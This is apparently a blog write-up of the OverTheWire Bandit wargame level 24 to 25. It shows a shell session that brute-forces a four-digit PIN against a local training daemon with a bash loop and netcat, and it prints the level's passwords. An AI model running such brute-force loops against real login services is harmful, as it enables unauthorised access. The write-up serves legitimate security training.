---
title: OverTheWire Bandit Level 24 - 25
date: 2022-07-29T07:00:00
tags: [overthewire, bandit, linux, shell, networking]
---
# Prompt
> A daemon is listening on port 30002 and will give you the password for `bandit25` if given the password for `bandit24` and a secret numeric 4-digit PIN code. There is no way to retrieve the PIN code except by going through all of the 10000 combinations, called brute-forcing.

# Solution
```sh
$ ssh bandit24@bandit.labs.overthewire.org -p 2220
bandit24@bandit.labs.overthewire.org password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
bandit24@bandit:~$ cd $(mktemp -d)
bandit24@bandit:/tmp/tmp.doM3xvTNc4$ for i in {0000..9999}; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> bandit24.log; done
bandit24@bandit:/tmp/tmp.doM3xvTNc4$ cat bandit24.log | nc localhost 30002 > bandit25.log
bandit24@bandit:/tmp/tmp.doM3xvTNc4$ grep -v "Wrong!" bandit25.log
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```

# References
* MayADevBe. (2022, May 30). OverTheWire Bandit Level 24 - 25. MayADevBe. <https://mayadevbe.me/posts/overthewire/bandit/level25/>